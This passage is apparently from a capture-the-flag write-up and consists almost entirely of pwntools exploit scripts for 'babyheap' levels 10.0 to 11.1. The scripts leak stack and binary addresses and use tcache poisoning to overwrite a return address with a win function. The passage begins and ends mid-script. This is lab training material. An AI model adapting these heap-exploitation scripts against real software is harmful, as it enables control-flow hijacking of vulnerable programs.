</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level10.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001afd</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001a00</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;your allocations is at: &#39;</span>)
</span></span><span style="display:flex;"><span>cur_stack_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>stack_ret <span style="color:#f92672">=</span> cur_stack_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7fffffffe240</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7fffffffe358</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;main is at: &#39;</span>)
</span></span><span style="display:flex;"><span>cur_main_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>cur_win_addr <span style="color:#f92672">=</span> cur_main_addr <span style="color:#f92672">-</span> main_addr <span style="color:#f92672">+</span> win_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (hex(stack_ret), hex(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(stack_ret))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>quit(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-101">level 10.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level10.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000014fd</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;your allocations is at: &#39;</span>)
</span></span><span style="display:flex;"><span>cur_stack_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>stack_ret <span style="color:#f92672">=</span> cur_stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x118</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;main is at: &#39;</span>)
</span></span><span style="display:flex;"><span>cur_main_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>cur_win_addr <span style="color:#f92672">=</span> cur_main_addr <span style="color:#f92672">-</span> main_addr <span style="color:#f92672">+</span> win_addr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (hex(stack_ret), hex(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(stack_ret))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>quit(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-110">level 11.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level11.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001cce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001b00</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x430</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>stack_addr <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print (hex(bin_echo))
</span></span><span style="display:flex;"><span>print (hex(stack_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cur_win_addr <span style="color:#f92672">=</span> bin_echo <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x33f8</span> <span style="color:#f92672">+</span> win_addr
</span></span><span style="display:flex;"><span>stack_ret <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x7ffc2f189f28</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7ffc2f189db2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(stack_ret))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(cur_win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>quit(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-111">level 11.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level11.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000016ce</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001500</span>
</span></span><span style="display:flex;"><span>
